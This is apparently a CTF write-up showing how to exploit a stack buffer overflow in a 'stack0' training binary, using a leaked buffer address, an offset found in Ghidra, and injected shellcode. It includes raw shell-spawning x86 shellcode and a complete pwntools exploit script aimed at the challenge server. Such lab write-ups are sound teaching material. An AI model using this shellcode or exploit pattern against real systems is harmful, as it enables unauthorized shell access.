**This is a writeup for the stack0 part2 challenge**

Below is the main function that our prorgam will run
```
void func(void) {
	bool didPurchase = false;
	char input[50];
	
	printf("Debug info: Address of input buffer = %p\n", input);
	
	printf("Enter the name you used to purchase this program:\n");
	read(STDIN_FILENO, input, 1024);
	
	if(didPurchase) {
		printf("Thank you for purchasing Hackersoft Powersploit!\n");
		giveFlag();
	}
	else {
		printf("This program has not been purchased.\n");
	}
}

int main(void) {
	func();
	return 0;
}
```

Our main function has a buffer that has a space of 50 bytes that we are writing to. This is the main bug of the program.
```
read(STDIN_FILENO, input, 1024);
```

This line is telling us that we are reading from standard input, putting the data into the input, and reading up to 1024 characters. That is the main bug since we can put mroe characters into standard input than the buffer can handle.

Our next biggest piece of the payload comes from this line
```
printf("Debug info: Address of input buffer = %p\n", input);
```

THis is telling us the address to our input buffer since it changes each run. This is important because in order to get the flag, we will need to overwrite the return address to land back at this input buffer.

**Exploit Method**

So the first thing that we need to get for this exploit is the value that the function is outputting for our input buffer. We can do so by using these lines of code.
```
r.recvuntil(b"Debug info: Address of input buffer = ")
BUFF_ADDR = int(r.recvline().strip(), 16)
```

What this is doing is once we reach that line in the program, we are capturing the address value input, removing white space like \n, and then converting it into an integer.

Now the next important thing we need to find is the offset of the program so that we can overwrite the return address. We can calculate this offset by looking at the stack layout in ghidra.
```
RETURN
Stack[-0x8]:4 
Stack[-0xd]:1 didPurchase
Stack[-0x3f]:1 input
```

So the offset from our input buffer to the return address is 3 x 16 + 15 = 63

Lastly, before we can fnish our payload we need to figure out what we are going to put into the input buffer.

This challenge requires us to get a shell on the machine in order to get the flag. Now how can we do this? Well if you remember, we have the address of the input buffer meaning that if we overwrite the return address with this address we can get teh flag.

So why does this work?

This works because when the return address executes, we tell the instruction pointer to execute the code if the stack is executable. The CPU will begin to execute the shell code that we put into the buffer.

Finding functioning shellcode is quite annoying so here is the shellcode that I used for my exploit

```
shellcode = (
    b"\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1" +
    b"\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81" +
    b"\xef\x62\xae\x61\x69\x57\xff\xd4"
)
```

Now lets construct our payload:

```
payload = shellcode + b"A" * (OFFSET - len(shellcode)) + p32(BUFF_ADDR)
```

We are loading our shellcode into the buffer, hen we are trying to find how many more valid bytes there is between what we just wrote and the return address. That is why we do our "OFFSET - len(shellcode)". Now that we have reached the return address, we can overwrite it with the address of the input buffer.

Now all together our exploit looks like this 
```
#!/usr/bin/env python3

from pwn import *

HOST = "ctf.hackucf.org"
PORT = 32101
BINARY = "./stack0"

elf = ELF(BINARY)
context.binary=elf

OFFSET = 63

def exploit_remote():
    r = remote(HOST, PORT)
    r.recvuntil(b"Debug info: Address of input buffer = ")
    BUFF_ADDR = int(r.recvline().strip(), 16)

    shellcode = (
        b"\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1" +
        b"\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81" +
        b"\xef\x62\xae\x61\x69\x57\xff\xd4"
    )

    payload = shellcode + b"B" * (OFFSET - len(shellcode)) + p32(BUFF_ADDR)

    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    exploit_remote()
```
